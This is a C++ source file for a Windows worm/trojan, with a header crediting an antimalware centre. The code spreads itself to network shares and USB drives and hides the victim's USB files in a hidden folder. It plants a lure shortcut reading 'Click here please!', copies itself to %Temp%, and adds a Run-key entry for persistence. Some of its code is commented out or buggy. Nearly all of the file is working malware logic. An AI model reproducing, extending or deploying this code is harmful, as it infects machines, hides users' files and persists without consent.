//////////////////////////////////////////////////////////////////////////////////////////
// Author: SonTDc
// Organization: Bkav Corporation - Antimalware Centre
// Name: Trojan
// Behavour: Spread via Share Folder; spread via usb; Detect Lan Network; 
///////////////////////////////////////////////////////////////////////////////////////// 

#include <Windows.h>
#include "stdafx.h"
#include "Worm01.h"
#include "shlwapi.h"
#include "winnls.h"
#include "shobjidl.h"
#include "objbase.h"
#include "objidl.h"
#include "shlguid.h"
#include "Shlobj.h"
#include "strsafe.h"
#include "psapi.h"
#include <IPHlpApi.h>

#define MAX_LOADSTRING 2048
#define VIRUS_NAME L"Trojan01.exe"
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "Mpr.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Iphlpapi.lib")
#pragma warning(disable:4996)
#pragma warning(push)
#pragma warning(disable: 4995)
#include <set>
#pragma warning(pop)
//----------------------------------------------------------------
// Name: SpreadNetwork()
// Description: Copy File
// Parameter: TCHAR* szNetworkPath
// Return: True if done
//----------------------------------------------------------------
BOOL SpreadNetwork(TCHAR* szNetworkPath)
{
	TCHAR szFilePath[MAX_PATH] = { 0 };
	TCHAR* pszFileName;
	TCHAR szSpreadFile[MAX_PATH] = { 0 };

	/*if (IsBadReadPtr(szNetworkPath, sizeof(TCHAR)))
	return FALSE;*/
	GetModuleFileName(0, szFilePath, MAX_PATH);
	pszFileName = PathFindFileName(szFilePath);
	_stprintf_s(szSpreadFile, MAX_PATH, L"%s\\%s", szNetworkPath, pszFileName);
	if (!CopyFileEx(szFilePath, szSpreadFile, 0, 0, 0, 0))
		return FALSE;
	return TRUE;
}

//----------------------------------------------------------------
// Name: SpreadShareFolder
// Description: spread via share folder
// Parameter:
// Return: 1 if done
//----------------------------------------------------------------
DWORD WINAPI SpreadShareFolder(LPNETRESOURCE lpnr, DWORD* pdwErrorCode)
{
	DWORD dwResult, dwResultEnum;
	HANDLE hEnum;
	DWORD cbBuffer = 16384;
	DWORD cEntries = -1;
	LPNETRESOURCE lpnrLocal;
	DWORD i;

	// Xac nhan quyen ghi vao vung nho chi dinh
	/*if (IsBadWritePtr(pdwErrorCode, sizeof(DWORD)))
	return FALSE;*/

	// Khoi tao mang
	dwResult = WNetOpenEnum(RESOURCE_GLOBALNET,
		RESOURCETYPE_DISK, // Network resource tren dia
		0,
		lpnr,
		&hEnum);

	if (dwResult != NO_ERROR)
	{
		*pdwErrorCode = dwResult;
		return FALSE;
	}

	// Yeu cau cap phat vung nho tu Heap, gia tri vung nho bang 0
	lpnrLocal = (LPNETRESOURCE)GlobalAlloc(GPTR, cbBuffer);
	if (lpnrLocal == NULL)
		return FALSE;

	do
	{

		// Liet ke cac source disk trong mang
		dwResultEnum = WNetEnumResource(hEnum, &cEntries, lpnrLocal, &cbBuffer);

		if (dwResultEnum == NO_ERROR)
		{
			for (i = 0; i < cEntries; i++)
			{
				NETRESOURCE nr = { 0 };
				nr.dwType = RESOURCETYPE_DISK;
				nr.lpRemoteName = lpnrLocal[i].lpRemoteName;
				// Ket noi may tinh den thu muc share
				DWORD ret = WNetAddConnection2(&nr, 0, 0, CONNECT_TEMPORARY);
				if (ret == NO_ERROR)
					// Goi ham SpreadNetwork de copy file
					SpreadNetwork(lpnrLocal[i].lpRemoteName);

				// Luu thong tin ra file
				/*HANDLE hFileShareNetworkInfo = CreateFile(L"",
				GENERIC_WRITE | GENERIC_READ,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				NULL,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_HIDDEN,
				NULL);
				TCHAR re[MAX_LOADSTRING] = L"";
				_tcscat_s(re, L"\r\tLocal Name: ");
				_tcscat_s(re, nr.lpLocalName);
				_tcscat_s(re, L"\r\tRemote Name: ");
				_tcscat_s(re, nr.lpRemoteName);
				_tcscat_s(re, L"Provider: ");
				_tcscat_s(re, nr.lpProvider);

				DWORD dwNumberOfBytesWritten;
				BOOL bWriteFile = WriteFile(hFileShareNetworkInfo,
				re, _tcslen(re) * 2,
				&dwNumberOfBytesWritten,
				NULL);
				if (bWriteFile == FALSE)
				MessageBox(NULL, L"Fail", L"Notify", NULL);
				CloseHandle(hFileShareNetworkInfo);*/

				// Ngat ket noi
				WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);

				if (RESOURCEUSAGE_CONTAINER == (lpnrLocal[i].dwUsage & RESOURCEUSAGE_CONTAINER))
					SpreadShareFolder(&lpnrLocal[i], pdwErrorCode);
			}
		}
		// Process Error
		else if (dwResultEnum != ERROR_NO_MORE_ITEMS)
		{
			*pdwErrorCode = dwResultEnum;
			break;
		}
		//ZeroMemory(&lpnrLocal, cbBuffer);
	} while (dwResultEnum != ERROR_NO_MORE_ITEMS);

	GlobalFree((HGLOBAL)lpnrLocal);
	dwResult = WNetCloseEnum(hEnum);
	if (dwResult != NO_ERROR)
	{
		*pdwErrorCode = dwResult;
		return FALSE;
	}

	return TRUE;

}

//----------------------------------------------------------------
// Name: ScanFile
// Description: Find all file in a directory and move them
// Parameter: TCHAR *lpPath, TCHAR *lpPathToMove
// Return: 1 if done
//---------------------------------------------------------------
//int WINAPI ScanFile(TCHAR *lpPath, TCHAR *szFolderToMove)
//{
//	HANDLE hFindFile = NULL;
//	WIN32_FIND_DATA wfdData;
//	hFindFile = FindFirstFile(lpPath, &wfdData);
//	TCHAR lpFileToMove[MAX_LOADSTRING];
//	TCHAR lpFile[MAX_LOADSTRING];
//
//	if (hFindFile == INVALID_HANDLE_VALUE)
//	{
//		MessageBox(NULL, L"Fail", L"Notify", NULL);
//	}
//	do
//	{
//		if (_tcscmp(wfdData.cFileName, szFolderToMove) == 0)
//			continue;
//		_tcscpy_s(lpFileToMove, lpPath);
//		_tcscat_s(lpFileToMove, L"\\");
//		_tcscat_s(lpFileToMove, wfdData.cFileName);
//		_tcscpy_s(lpFile, lpPath);
//		_tcscat_s(lpFile, L"\\");
//		_tcscat_s(lpFile, szFolderToMove);
//		_tcscat_s(lpFile, L"\\");
//		_tcscat_s(lpFile, wfdData.cFileName);
//		MoveFile(lpFileToMove, lpFile);
//	} while (FindNextFile(hFindFile, &wfdData) != 0);
//
//	return 1;
//}


HRESULT CreateLink(TCHAR *lpszPathObj, LPCWSTR lpszPathLink, LPCWSTR lpszDesc, LPCWSTR lpszWorkingDirectory)
{
	HRESULT hres;
	IShellLink* psl;
	CoInitialize(NULL);
	// Get a pointer to the IShellLink interface. It is assumed that CoInitialize
	// has already been called.
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&psl);
	if (SUCCEEDED(hres))
	{
		IPersistFile* ppf;

		psl->SetPath(lpszPathObj);
		psl->SetDescription(lpszDesc);
		psl->SetIconLocation(L"C:\\WINDOWS\\system32\\imageres.dll", 30);
		psl->SetWorkingDirectory(lpszWorkingDirectory);
		hres = psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf);

		if (SUCCEEDED(hres))
		{
			WCHAR wsz[MAX_PATH];
			//MultiByteToWideChar(CP_ACP, 0, lpszPathLink, -1, wsz, MAX_PATH);
			hres = ppf->Save(lpszPathLink, TRUE);
			ppf->Release();
		}
		psl->Release();
	}
	CoUninitialize();
	return hres;
}

//----------------------------------------------------------------
// Name: SpreadUsb
// Description: Scan, detect and spread via usb
// Parameter:
// Return: 1 if done
//----------------------------------------------------------------
DWORD WINAPI SpreadUsb()
{
	TCHAR* pszFileName = NULL;
	TCHAR szFilePath[MAX_PATH] = { 0 };
	TCHAR szVolumePath[MAX_PATH] = { 0 };
	TCHAR szUsbPath[MAX_PATH] = { 0 };
	HANDLE hFindVolume = INVALID_HANDLE_VALUE;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HANDLE hEvent;
	DWORD dwErrorCode = 0;
	HRESULT hRes;
	WIN32_FIND_DATA ffd;
	IPersistFile* pPersistFile;
	IShellLink* pShellLink;

	hEvent = CreateEvent(0, TRUE, TRUE, L"USBFakeDrive__vakb");
	SetEvent(hEvent);

	if (!GetModuleFileName(0, szFilePath, MAX_PATH))
		return GetLastError();
	pszFileName = PathFindFileName(szFilePath);
	if (pszFileName == NULL)
		return GetLastError();

	// Neu la duong dan binh thuong thi thoat, neu la duong dan temp thi  qet tiep
	while (1)
	{
		pPersistFile = NULL;
		pShellLink = NULL;
		ZeroMemory(szVolumePath, MAX_PATH * sizeof(TCHAR));
		ZeroMemory(szUsbPath, MAX_PATH * sizeof(TCHAR));

		hFindVolume = FindFirstVolume(szVolumePath, MAX_PATH);

		if (hFindVolume == INVALID_HANDLE_VALUE)
			return GetLastError();

		do
		{
			if (GetDriveType(szVolumePath) == DRIVE_REMOVABLE)
			{
				ZeroMemory(szUsbPath, MAX_PATH * sizeof(TCHAR));
				_stprintf_s(szUsbPath, MAX_PATH, L"%s%s", szVolumePath, pszFileName);
				if (!CopyFileEx(szFilePath, szUsbPath, 0, 0, 0, 0))
					dwErrorCode = GetLastError();

				hFile = CreateFile(szUsbPath,
					GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
					0,
					OPEN_EXISTING,
					FILE_ATTRIBUTE_NORMAL,
					0);

				SetFileAttributes(szUsbPath, FILE_ATTRIBUTE_HIDDEN);

				if (hFile == INVALID_HANDLE_VALUE)
				{
					dwErrorCode = GetLastError();
					continue;
				}

				TCHAR lpszFilePath[MAX_LOADSTRING];
				DWORD dwFilePath = NULL;
				
				CloseHandle(hFile);
				PathRemoveFileSpec(szUsbPath);
				TCHAR lpFolderPath[MAX_LOADSTRING];
				TCHAR lpUsb[MAX_LOADSTRING];
				
				_tcscpy_s(lpFolderPath, szUsbPath);
				char temp = '\0';
				temp = 0xA0;
				TCHAR szNameOfFolder[MAX_LOADSTRING];
				swprintf_s(szNameOfFolder, MAX_LOADSTRING, L"%hc", temp);
				_tcscat_s(lpFolderPath, szNameOfFolder);
				CreateDirectory(lpFolderPath, NULL);
				SetFileAttributes(lpFolderPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_DIRECTORY);

				//----------------------------------------------
				HANDLE hFindFile = NULL;
				WIN32_FIND_DATA wfdData;
				_tcscpy_s(lpUsb, szUsbPath);
				_tcscat_s(szUsbPath, L"*.*");
				hFindFile = FindFirstFile(szUsbPath, &wfdData);
				TCHAR lpFileToMove[MAX_LOADSTRING];
				TCHAR lpFile[MAX_LOADSTRING];

				if (hFindFile == INVALID_HANDLE_VALUE)
				{
					MessageBox(NULL, L"Fail", L"Notify", NULL);
				}
				do
				{
					if (_tcscmp(wfdData.cFileName, lpFolderPath) == 0)
						continue;
					_tcscpy_s(lpFileToMove, lpUsb);
					_tcscat_s(lpFileToMove, wfdData.cFileName);
					_tcscpy_s(lpFile, lpFolderPath);
					_tcscat_s(lpFile, L"\\");
					_tcscat_s(lpFile, wfdData.cFileName);
					MoveFile(lpFileToMove, lpFile);
				} while (FindNextFile(hFindFile, &wfdData) != 0);
				Sleep(1000);

				//Check file o trong temp hay trong usb neu o trong temp thi end process, create new process trong usb
				// con neu ko thi tao shorcut roi endprocess
				TCHAR szTempPath[MAX_LOADSTRING];
				GetTempPath(sizeof(szTempPath), szTempPath);
				TCHAR szCurrentFile[MAX_LOADSTRING];
				GetCurrentDirectory(sizeof(szCurrentFile), szCurrentFile);

				if (_tcscmp(szTempPath, szCurrentFile) != 0)
				{
					TCHAR szPathLink[MAX_LOADSTRING];
					_tcscpy_s(szPathLink, lpUsb);
					_tcscat_s(szPathLink, L"Worm01.lnk");

					TCHAR szWorkingDirectory[MAX_LOADSTRING];
					_tcscpy_s(szWorkingDirectory, lpFolderPath);

					TCHAR szPathObj[MAX_LOADSTRING];
					_tcscpy_s(szPathObj, L"..\\Worm01.exe");

					HRESULT hShortcut = CreateLink(szPathObj, szPathLink, L"Click here please!", szWorkingDirectory);
					break;
				}
				//----------------------------------------------
				else {
					STARTUPINFO info = { sizeof(info) };
					PROCESS_INFORMATION processInfo;

					TCHAR szFile[MAX_LOADSTRING];
					_tcscpy_s(szFile, lpFolderPath);
					_tcscat_s(szFile, L"Worm01.exe");
					CreateProcess(NULL, szFile, NULL, NULL, TRUE, 0, NULL, lpFolderPath, &info, &processInfo);
				}
				
			}

		} while (FindNextVolume(hFindVolume, szVolumePath, MAX_PATH));
		FindVolumeClose(hFindVolume);
		Sleep(1000);
	}

	return dwErrorCode;
}

//----------------------------------------------------------------
// Name: GetInfoLanNetwork
// Description: Review IP and some infomation of victim network
// Parameter:
// Return: 1 if done
//----------------------------------------------------------------
DWORD WINAPI GetInfoLanNetWork()
{

	return 0;
}

//----------------------------------------------------------------
// Name: SetNotViewHiddenItem()
// Description: Can't view file or folder has hidden attributes and 
// set no show file name extensions
// Parameter: 
// Return: True if done
//-----------------------------------------------------------------
VOID WINAPI SetNotViewHiddenItem()
{
	while (true)
	{
		LPSHELLSTATE lpss = NULL;
		lpss->fShowAllObjects = FALSE;
		lpss->fShowExtensions = FALSE;

		SHGetSetSettings(lpss, SSF_SHOWALLOBJECTS | SSF_SHOWEXTENSIONS, TRUE);
		Sleep(5000);
	}

}

//------------------------------------------------------------------
// Name: CopyToTemp()
// Description: Copy to %Temp% Folder
// Parameter: 
// Return: 
//------------------------------------------------------------------
VOID WINAPI CopyToTemp()
{
	// Get link of virus in temp
	DWORD dwTempPathLen = NULL;
	TCHAR lpTempPath[MAX_LOADSTRING];
	DWORD dwValueTempPathSize = GetTempPath(dwTempPathLen, lpTempPath);;

	if (dwValueTempPathSize == 0)
		return;
	TCHAR lpVirus[MAX_LOADSTRING];
	TCHAR lpLocalVirus[MAX_LOADSTRING];
	_tcscpy_s(lpVirus, lpTempPath);
	_tcscat_s(lpVirus, VIRUS_NAME);

	// Get link of virus in local
	GetModuleFileName(0, lpLocalVirus, MAX_LOADSTRING);
	if (CopyFileEx(lpLocalVirus, lpVirus, 0, 0, 0, 0) == 0)
	{
		return;
	}

	SetFileAttributes(lpVirus, FILE_ATTRIBUTE_HIDDEN);
}

//-------------------------------------------------------------------
// Name: SetStartupRegKey
// Description: set virus run when starting up
// Parameter:
// Return: 
//-------------------------------------------------------------------
VOID WINAPI SetStartupRegKey()
{
	WCHAR szRunKey[MAX_LOADSTRING];
	HKEY hRunKey;

	// Get link of virus in temp
	DWORD dwTempPathLen = NULL;
	TCHAR lpTempPath[MAX_LOADSTRING];
	DWORD dwValueTempPathSize = GetTempPath(dwTempPathLen, lpTempPath);;

	if (dwValueTempPathSize == 0)
		return;
	TCHAR lpVirus[MAX_LOADSTRING];
	TCHAR lpLocalVirus[MAX_LOADSTRING];
	_tcscpy_s(lpVirus, lpTempPath);
	_tcscat_s(lpVirus, VIRUS_NAME);

	_tcscpy_s(szRunKey, lpVirus);
	_tcscat_s(szRunKey, L" \/ startup");
	TCHAR lpRunKey[MAX_LOADSTRING] = L"Software\\Microsoft\\Windows\CurrentVersion\\Run";

	RegCreateKeyEx(HKEY_CURRENT_USER,
		lpRunKey,
		0,
		NULL,
		0,
		KEY_ALL_ACCESS,
		NULL,
		&hRunKey,
		NULL);

	DWORD dwKeySetValue = RegSetKeyValue(hRunKey,
		VIRUS_NAME,
		0,
		REG_SZ,
		(LPBYTE)szRunKey,
		sizeof(szRunKey));

	RegCloseKey(hRunKey);

	return;

}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPWSTR    lpCmdLine,
	_In_ int       nCmdShow)
{

	HANDLE hMutex;
	hMutex = CreateMutex(NULL, TRUE, L"worm");
	if (hMutex == NULL)
		return 0;

	TCHAR lpTempPath[MAX_LOADSTRING] = L"";
	DWORD dwGetTemp = GetTempPath(MAX_LOADSTRING, lpTempPath);
	if (dwGetTemp == NULL || dwGetTemp > MAX_LOADSTRING)
		return 0;
	TCHAR szCurrentDirectory[MAX_LOADSTRING];
	GetCurrentDirectory(sizeof(szCurrentDirectory), szCurrentDirectory);
	
	// Check where running virus
	if (_tcscmp(szCurrentDirectory, lpTempPath) != 0)
	{
		TCHAR lpFileVirus[MAX_LOADSTRING];
		TCHAR lpCurrentFile[MAX_LOADSTRING];
		if (GetModuleFileName(NULL, lpCurrentFile, MAX_LOADSTRING) == 0)
			return 0;
		_tcscpy_s(lpFileVirus, lpTempPath);
		_tcscat_s(lpFileVirus, L"\\");
		_tcscat_s(lpFileVirus, L"Worm01.exe");
		if (CopyFile(lpCurrentFile, lpFileVirus, NULL) == 0)
			return 0;
		SetFileAttributes(lpFileVirus, FILE_ATTRIBUTE_HIDDEN);

		// CreateProcess
		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		CreateProcess(NULL, lpFileVirus, NULL, NULL, TRUE, 0, NULL, lpTempPath, &info, &processInfo);
		return 1;
	}

	//// Set not view hidden item
	//SetStartupRegKey();
	//DWORD dwThreadId = NULL;
	//HANDLE hThreadSetNotView = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SetNotViewHiddenItem, NULL, NULL, &dwThreadId);
	//if (hThreadSetNotView == NULL)
	//	return 0;
	//// Set key run
	//DWORD dwThreadId2 = NULL;
	//HANDLE hThreadSetKeyRun = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SetStartupRegKey, NULL, NULL, &dwThreadId2);
	//if (hThreadSetKeyRun == NULL)
	//	return 0;
	//// Spread USB
	SpreadUsb();
	
	CloseHandle(hMutex);
	return 1;

}
